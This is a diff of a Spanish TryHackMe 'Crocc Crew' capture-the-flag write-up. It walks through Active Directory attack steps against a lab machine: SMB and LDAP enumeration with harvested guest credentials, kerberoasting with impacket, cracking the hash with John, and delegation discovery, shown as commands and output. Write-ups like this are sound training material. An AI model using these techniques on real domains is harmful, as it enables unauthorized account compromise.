@@ -28,9 +28,7 @@ image = "https://tryhackme-images.s3.amazonaws.com/room-icons/d387f5c6b5c2bfd074
 
 #### Reconocimiento: 
 
-Usaremos la herramienta de nmap para escanear puertos y versiones...
-
-haremos un `( sudo nmap -sS --min-rate 5000 -sCV -p- -A $ip -oN nmap_all.txt ) `
+## Usaremos la herramienta de nmap para escanear puertos y versiones...
 
 ```bash
 # Nmap 7.92 scan initiated Fri May  6 14:04:28 2022 as: nmap -sS --min-rate 5000 -sCV -p- -A -oN nmap_all.txt 10.10.87.107
@@ -109,48 +107,38 @@ HOP RTT       ADDRESS
 2   197.07 ms 10.10.87.107
 ```
 
-Explicacion de cada parametro seleccionado:
+## Explicacion de cada parametro usado:
  
-```yaml
-_________________________________________________________________________________________________________________
--sS para habilitar la opcion SYN Port Scan,
- --min-rate 5000 para que no envie paquetes menores a 5000 por segundo,
- -sCV para que lanze una serie de scripts de enumeraciones y para 
-que nos saque banner y versiones de los servicios,
- -p- para que nos haga un escaneo de los 65535 puertos,
- -A para habilitar la deteccion del SO = Sistema Operativo,
- la deteccion de versiones y escaneo de rutas,
- -oN para guardarlo en un formato por default de nmap,
- en mi caso yo le coloque el nombre de "nmap_all.txt"
-_____________________________________________________________________________________________________________________
-```
+#### -sS para habilitar la opcion SYN Port Scan,--min-rate 5000 para que no envie paquetes menores a 5000 por segundo,-sCV para que lanze una serie de scripts de enumeraciones y para que nos saque banner y versiones de los servicios,-p- para que nos haga un escaneo de los 65535 puertos, -A para habilitar la deteccion del SO = Sistema Operativo,la deteccion de versiones y escaneo de rutas, -oN para guardarlo en un formato por default de nmap, en mi caso yo le coloque el nombre de "nmap_all.txt"
 
 #### Enumeracion de Directorios:
 
-usaremos la herramienta de dirsearch para enumerar directorios de la pagina...
+### Usaremos la herramienta de dirsearch para enumerar directorios de la pagina...
 
 #### Instalacion Dirsearch: 
 
-`git clone https://github.com/maurosoria/dirsearch.git`
+```bash
+git clone https://github.com/maurosoria/dirsearch.git`
+```
 
-veremos que nos dejo una carpeta asi que entraremos con cd dirsearch
+#### vemos que nos dejo una carpeta asi que entraremos con cd dirsearch, ejecutaremos la herramienta seleccionando el parametro -u para la url  
 
-ahora haremos un `./dirsearch.py -u http://10.10.210.71`
+```bash
+./dirsearch.py -u http://10.10.210.71
+```
 
 ![dirsearch](dir.png)
-con la enumeracion realizada veremos que hay un `/robots.txt` , para los que no sepan que son los robots.txt basicamente:
+#### con la enumeracion realizada veremos que hay un `/robots.txt` , para los que no sepan que son los robots.txt basicamente:
 
 #### ¿Que es robots.txt?
 
 ![robots.txt](https://cdn.fandangoseo.com/wp-content/uploads/2021/04/robots_txt700.png)
 
-`Un archivo robots.txt es un archivo que se encuentra en la raíz de un sitio e indica a qué partes no quieres que accedan los rastreadores de los motores de búsqueda. El archivo utiliza el Estándar de exclusión de robots, que es un protocolo con un pequeño conjunto de comandos que se puede utilizar para indicar el acceso al sitio web por sección y por tipos específicos de rastreadores web (como los rastreadores móviles o los rastreadores de ordenador)`
-
-ya con eso aprendido haremos un
+#### Un archivo robots.txt es un archivo que se encuentra en la raíz de un sitio e indica a qué partes no quieres que accedan los rastreadores de los motores de búsqueda. El archivo utiliza el Estándar de exclusión de robots, que es un protocolo con un pequeño conjunto de comandos que se puede utilizar para indicar el acceso al sitio web por sección y por tipos específicos de rastreadores web (como los rastreadores móviles o los rastreadores de ordenador)
 
 `curl http://10.10.140.48/robots.txt`
 
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ curl http://10.10.47.234/robots.txt
 User-Agent: *
@@ -158,13 +146,15 @@ Disallow:
 /robots.txt
 /db-config.bak
 /backdoor.php
-````
+```
 
-y vemos que nos da 3 directorios, veamos que hay en ellos.
+#### y vemos que hay 3 directorios, veamos que hay en ellos:
 
-haremos un `curl http://10.10.140.48/backdoor.php`
+```bash
+curl http://10.10.140.48/backdoor.php`
+```
 
-````html
+```html
 <!DOCTYPE html>
 <html>
 <head>
@@ -185,10 +175,10 @@ $('body').terminal({
     greetings: 'CroccCrew >:)'
 });
 </script>
-````	
-nada interesante, probemos con el directorio `/db-config.bak`
+```
+#### nada interesante, probemos con el directorio `/db-config.bak`
 
-````php
+```php
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ curl http://10.10.47.234//db-config.bak   
 <?php
@@ -206,47 +196,45 @@ die ("Connection Failed: " .$conn->connect_error);
 echo "Connected Successfully";
 
 ?>
-````
+```
 
 
-y tendremos las primeras credenciales. 
+#### y tendremos las primeras credenciales. 
 
-vemos que hay smbclient pero antes que nada necesitaremos algunas credenciales para acceder, he intentando con las que nos dio `/db-config-bak` pero no nos ha funcionado.. 
+#### vemos que hay un srevicio ejecutandose de smb pero antes que nada necesitaremos algunas credenciales para acceder, he intentando con las que nos dio `/db-config-bak` pero no nos ha funcionado.. 
 
-ahora probaremos con la herramienta `rpcclient`
+#### ahora probaremos con la herramienta `rpcclient`
  
-para los que no sepan que es esta herramienta les dejare un resumen:
+### ¿Que es rpclient?
 
-#### ¿Que es rpclient?
+#### El programa rpcclient ejecuta comandos administrativos usando Microsoft RPCs, el cual proporciona acceso a la interfaz de administración gráfica del usuario Windows (GUIs) para la administración de sistemas. Usualmente es utilizado por los usuarios más avanzados que entienden la complejidad de Microsoft RPCs.
 
-El programa rpcclient ejecuta comandos administrativos usando Microsoft RPCs, el cual proporciona acceso a la interfaz de administración gráfica del usuario Windows (GUIs) para la administración de sistemas. Usualmente es utilizado por los usuarios más avanzados que entienden la complejidad de Microsoft RPCs.
+```bash
+rpcclient -U% 10.10.140.48` 
+```
 
-haremos un: `rpcclient -U% 10.10.140.48` 
-
-ya estamos como cliente de rpc ahora escribiremos `enumprivs`
+#### ya estamos como cliente de rpc ahora escribiremos `enumprivs`
 
 ![rpcclient](rpcclient.png)
 
-El comando `enumprivs` reveló los privilegios del usuario actual en la máquina. Podemos ver que `"SeEnableDelegationPrivilege"` aparece junto con `"SeDelegateSessionUserImpersonatePrivilege"`. `"SeEnableDelegationPrivilege"` determina si una cuenta de usuario puede permitir que se confíe en las cuentas de usuario para la delegación. Esto puede influir en la delegación restringida
+#### El comando `enumprivs` reveló los privilegios del usuario actual en la máquina. Podemos ver que `"SeEnableDelegationPrivilege"` aparece junto con `"SeDelegateSessionUserImpersonatePrivilege"`. `"SeEnableDelegationPrivilege"` determina si una cuenta de usuario puede permitir que se confíe en las cuentas de usuario para la delegación. Esto puede influir en la delegación restringida
 
-Nota: cada vez que yo ponga una ip ustedes tendran que cambiarla a por la de su maquina.
+#### nos conectaremos remotamente al escritorio de windows usando RPD `( Remote Desktop Protocol )` 
 
-nos conectaremos remotamente al escritorio de windows usando RPD `( Remote Desktop Protocol )` 
+```bash
+rdesktop -f -u "" 10.10.140.48`
+```
+#### nos preguntara ¿Confía en este certificado (sí/no)?
 
-haremos un `rdesktop -f -u "" 10.10.140.48`
-
-nos preguntara `¿Confía en este certificado (sí/no)?`
-
-escribiremos que `si`, o `yes`
+#### Escribiremos yes
 
 ![Remote Desktop Protocol](rdesktop.png)
 
-como vemos el wallpaper que tiene de pantalla de bloqueo no esta dejando unas credenciales en la parte inferior a la derecha Visitor GuestLogin!
-USER=Visitor PASSWORD=GuestLogin! si le damos abajo y intentamos cambiar de usuario y escribimos las credenciales tampoco nos dara acceso, dejaremos que se cierre solo el rdesktop, no tardara mucho...
+#### como vemos el wallpaper que tiene de pantalla de bloqueo no esta dejando unas credenciales en la parte inferior a la derecha Visitor GuestLogin! USER=Visitor PASSWORD=GuestLogin! si le damos abajo y intentamos cambiar de usuario y escribimos las credenciales tampoco nos dara acceso, dejaremos que se cierre solo el rdesktop, no tardara mucho...
 
-ya fuera de rdesktop tendremos las credenciales para smbclient asi que intentemos loguearnos, `smbclient -L 10.10.140.48 -U 'Visitor'`
+#### ya fuera de rdesktop tendremos las credenciales para smbclient asi que intentemos loguearnos.
 
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ smbclient -L 10.10.47.234 -U 'Visitor'
 Password for [WORKGROUP\Visitor]:
@@ -262,12 +250,10 @@ Password for [WORKGROUP\Visitor]:
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.47.234 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
-````
-`-L` hace referencia a LHOST y `-U` hace referencia a user.
+```
+#### -L hace referencia a LHOST y -U hace referencia a user.
 
-como vemos tampoco nos dio acceso al smbclient asi que usaremos la herramienta de smbmap
-
-para los que tengan una idea de lo que va esta herrameinta les dejo un corto resumen:
+#### como vemos tampoco nos dio acceso al smbclient asi que usaremos la herramienta de smbmap
 
 ### ¿Que es SmbMap?
 
@@ -277,11 +263,9 @@ para los que tengan una idea de lo que va esta herrameinta les dejo un corto res
 
 #### Obtencion de la primera Bandera!!!
 
-con eso aprendido podemos comenzar
-
 `smbmap -H 10.10.140.48 -u "Visitor" -p "GuestLogin\!" -r Home`
 
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~]
 └─$ smbmap -H 10.10.47.234 -u "Visitor" -p "GuestLogin\!" -r Home
 [+] IP: 10.10.47.234:445	Name: 10.10.47.234                                      
@@ -292,21 +276,15 @@ con eso aprendido podemos comenzar
 	dr--r--r--                0 Tue Jun  8 14:42:53 2021	.
 	dr--r--r--                0 Tue Jun  8 14:42:53 2021	..
 	fr--r--r--               17 Tue Jun  8 14:41:45 2021	user.txt
-````
+```
 
-`-u` para el usuario `-p` para la password `-r` para la ruta.
+#### -u para el usuario -p para la password -r para la ruta.
 
-Con `-r` nos estaremos moviendo de directorios y con `--download` los estariamos descargando
+#### Con -r nos estaremos moviendo de directorios y con --download los estariamos descargando
  
-Explorando vemos una carpeta compartida llamada Home la cual tiene la primera bandera asi que procedemos a descargarla con el siguiente comando
+#### Explorando vemos una carpeta compartida llamada Home la cual tiene la primera bandera asi que procedemos a descargarla con el siguiente comando
 
-`smbmap -H 10.10.140.48 -u "Visitor" -p "GuestLogin\!" -r Home --download Home/user.txt`
-
-haremos un `ls` y ahi estara en nuestro directorio, le haremos un cat para ver lo que contiene el archivo
-
-`cat 10.10.140.48-Home_user.txt`
-
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ smbmap -H 10.10.47.234 -u "Visitor" -p "GuestLogin\!" -r Home --download Home/user.txt
 [+] Starting download: Home\user.txt (17 bytes)
@@ -319,66 +297,58 @@ haremos un `ls` y ahi estara en nuestro directorio, le haremos un cat para ver l
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ cat 10.10.47.234-Home_user.txt | head -c 9
 THM{Gu3st
-````
+```
 * Nota: Ustedes claramente lo ejecutaran sin el | head -c 9, eso yo lo hago para que no haya un troll por ahi y solo quiera copiar y pegar las flags
 
-* Obtuvimos con exito la primera flag!!!
+### Obtuvimos con exito la primera flag!!!
 
-usaremos crackmapexec para ver que otro dominio tiene la pagina, se que esta herramienta deberia de ir en la seccion de post explotacion pero creo que aqui sera mas util
-cuando usemos impacket.
+#### usaremos crackmapexec para ver que otro dominio tiene la pagina, se que esta herramienta deberia de ir en la seccion de post explotacion pero creo que aqui sera mas util cuando usemos impacket.
 
-haremos un crackmapexec `smb 10.10.206.226 -u 'Visitor' -p 'GuestLogin!'`
-
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ crackmapexec smb 10.10.47.234 -u 'Visitor' -p 'GuestLogin!'
 /usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
   if result['type'] is not 'searchResEntry':
 SMB         10.10.47.234    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
 SMB         10.10.47.234    445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin!
-````
+```
 
-`-p = password -u = user`
 
-vemos que el dominio es `COOCTUS.CORP`, nos servira para el futuro.
+#### vemos que el dominio es `COOCTUS.CORP`, nos servira para el futuro.
 
-ahora vamos con la siguiente pregunta que nos hace TryHackMe 
+#### ahora vamos con la siguiente pregunta que nos hace TryHackMe 
 
 #### Pregunta 2 Usuario  plantado.
 
-¿Cuál es el nombre de la cuenta que plantó Crocc Crew? para esto usaremos la herramienta de LDAP para encontrar el usuario con las credenciales que anteriormente hemos encontrado...
+#### ¿Cuál es el nombre de la cuenta que plantó Crocc Crew? para esto usaremos la herramienta de LDAP para encontrar el usuario con las credenciales que anteriormente hemos encontrado...
 
-usaremos la herramienta de ldapdump para ver los usuarios, les dejare un resumen de lo que es basicamente esta herramienta...
-
-#### ¿Que es LDAPdump?
+### ¿Que es LDAPdump?
 
 ![ldap](ldapp.gif)
 
-`El protocolo ligero de acceso a directorios (en inglés: Lightweight Directory Access Protocol, también conocido por sus siglas de LDAP) hace referencia a un protocolo a nivel de aplicación que permite el acceso a un servicio de directorio ordenado y distribuido para buscar diversa información en un entorno de red.`
-
-con eso aprendido usaremos la dicha herramineta haremos un:
+#### El protocolo ligero de acceso a directorios (en inglés: Lightweight Directory Access Protocol, también conocido por sus siglas de LDAP) hace referencia a un protocolo a nivel de aplicación que permite el acceso a un servicio de directorio ordenado y distribuido para buscar diversa información en un entorno de red.
 
 #### Enumeracion con LDAP
 
-`ldapdomaindump $ip -u 'COOCTUS.CORP\Visitor' -p GuestLogin!`
+```bash
+ldapdomaindump $ip -u 'COOCTUS.CORP\Visitor' -p GuestLogin!`
+```
 
-nos iremos a la carpeta en la que estan y abriremos el archivo domain_user.html
+#### abriremos el archivo domain_user.html desde el navegador
 
 ![enumeracion con ldapdump](ldapdump.png)
 
-En domain_users.html podremos ver varios usuarios incluida la respuesta a la segunda pregunta y tambien podremos ver el usuario "reset" que lo usaremos mas adelante
+#### En domain_users.html podremos ver varios usuarios incluida la respuesta a la segunda pregunta y tambien podremos ver el usuario "reset" que lo usaremos mas adelante
 
-si no se confian de como sacamos y sabemos de que ese era el usuario, pues usaremos otra herramienta para ver la lista de usuarios..
+## Alternativa para sacar el usuario plantado sin usar ldap:
 
-#### Explicacion de la herramienta enum4linux:
+### Explicacion de la herramienta enum4linux:
 
-`enum4linux es una herramienta de enumeración de windows y sistemas samba. Esta intenta ofrecer una funcionabilidad similar a enum.exe antes disponible en www.bindview.com. Esta escrito en Perl y es básicamente incorpora todas las herramientas de smbclient, rpclient, net y nmblookup.`
+#### enum4linux es una herramienta de enumeración de windows y sistemas samba. Esta intenta ofrecer una funcionabilidad similar a enum.exe antes disponible en www.bindview.com. Esta escrito en Perl y es básicamente incorpora todas las herramientas de smbclient, rpclient, net y nmblookup.
 
 #### Enumeracion de usuarios con enum4linux:
 
-ahora si, haremos un `enum4linux -u 'Visitor' -p 'GuestLogin!' -U 10.10.140.48` 
-
-````bash
+```bash
 mora@H3nT4i:~$ enum4linux -u 'Visitor' -p 'GuestLogin!' -U 10.10.47.234
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 18 14:43:46 2022
 
@@ -463,25 +433,18 @@ enum4linux complete on Wed May 18 14:44:23 2022
 
                                                                                                                                                                                                
 mora@H3nT4i:~$
-````
-y veremos que nos dio una lista bastante extensa de usuarios, si van haciendo el procedimiento conmigo entonces les sera facil reconocer el usuario, con eso completado 
+```
+####y veremos que nos dio una lista bastante extensa de usuarios, si van haciendo el procedimiento conmigo entonces les sera facil reconocer el usuario, con eso completado 
 
 * pista: tiene el mismo nombre que la room
 
-basicamente solo busque algun nombre que coincidiera con la ctf, entre ellos estaba ese usuario...
+#### basicamente solo busque algun nombre que coincidiera con la ctf, entre ellos estaba ese usuario...
 
-#### Busqueda de Vulnerabilidades:
+### ¿Que es Impacket?
 
-usaremos la herramienta de impacket, para los que no sepan que es les dejare una
-explicacion:
+#### Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se enfoca en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implementación del protocolo en sí. Los paquetes pueden construirse desde cero, así como analizarse a partir de datos sin procesar, y la API orientada a objetos simplifica el trabajo con jerarquías profundas de protocolos. La biblioteca proporciona un conjunto de herramientas como ejemplos de lo que se puede hacer dentro del contexto de esta biblioteca
 
-#### ¿Que es Impacket?
-
-`Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se enfoca en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implementación del protocolo en sí. Los paquetes pueden construirse desde cero, así como analizarse a partir de datos sin procesar, y la API orientada a objetos simplifica el trabajo con jerarquías profundas de protocolos. La biblioteca proporciona un conjunto de herramientas como ejemplos de lo que se puede hacer dentro del contexto de esta biblioteca`
-
-con esto aprendido podemos comenzar:
-
-haremos un `impacket-GetUserSPNs 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.10.140.48 -request -outputfile TGS.txt`
+#### Probemos GetUserSPNs para ver si podemos encontrar una cuenta de servicio para abusar
 
 ````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
@@ -492,19 +455,14 @@ ServicePrincipalName  Name            MemberOf  PasswordLastSet             Last
 --------------------  --------------  --------  --------------------------  --------------------------  -----------
 HTTP/dc.cooctus.corp  password-reset            2021-06-08 17:00:39.356663  2021-06-08 16:46:23.369540  constrained 
 
-
-
                                                                                                                                                                 
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ ls
 10.10.47.234-Home_user.txt  TGS.txt
-````
+```
+#### si hacen un `cat TGS.txt` veran que nos dejo un HASH, intentemos romperlo con John The Ripper.
 
-para ver si podemos encontrar una cuenta de servicio para abusar.
-
-si hacen un `cat TGS.txt` veran que nos dejo un HASH, intentemos romperlo con John The Ripper.
-
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ cat TGS.txt 
 $krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$55e86b71f95ce0d2ce585af36adaef82$0a0j4
@@ -526,11 +484,9 @@ c068006c152f77c2f8a83cfa7c0f9888100259e85bce28a4ff33057942600b885636416310b9c7d8
 c8c4fbbdd88ceefe304fb38622060ce599d68de537c590428f4853ff54051a293f29dfc18ecf9dba782787b1c16bc6e320499facf5c6
 d25e3d1e6319df78ec92c09deece8e909bbce94a699441a880e9a5b967184b7356ba9c628bbf2f90d0e8c199d5ce6481cfe4e226cd2e
 a44bc1e3be560e3480ce92dbb54f8bd5bb58b407b6483b378a0a5f775175eb161aa81872bbe53
-````
+```
 
-haremos un  `john TGS.txt -w=/usr/share/wordlists/rockyou.txt`
-
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ john TGS.txt -w=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -540,17 +496,12 @@ re*********rd    (?)
 1g 0:00:00:00 DONE (2022-05-18 14:58) 2.439g/s 574751p/s 574751c/s 574751C/s rexon..reihan
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-````
+```
+#### y ahi estara las contraseña: `re*********rd`
 
-Nota: es probable que el diccionario este comprimido asi que te tendras que ir ala ruta /usr/share/wordlists/ y haras un gzip -d rockyou.txt y con eso ya funcionaria bien si es que en caso no lo hayas descomprimido antes.
+#### Uso de la delegación de búsqueda de impacket para extraer más información sobre la delegación.
 
-y ahi estara las contraseña: `re*********rd`
-
-ahora haremos un:
-
-`impacket-findDelegation -debug  COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.206.226`
-
-````bash
+```bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ impacket-findDelegation -debug  COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.47.234           
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
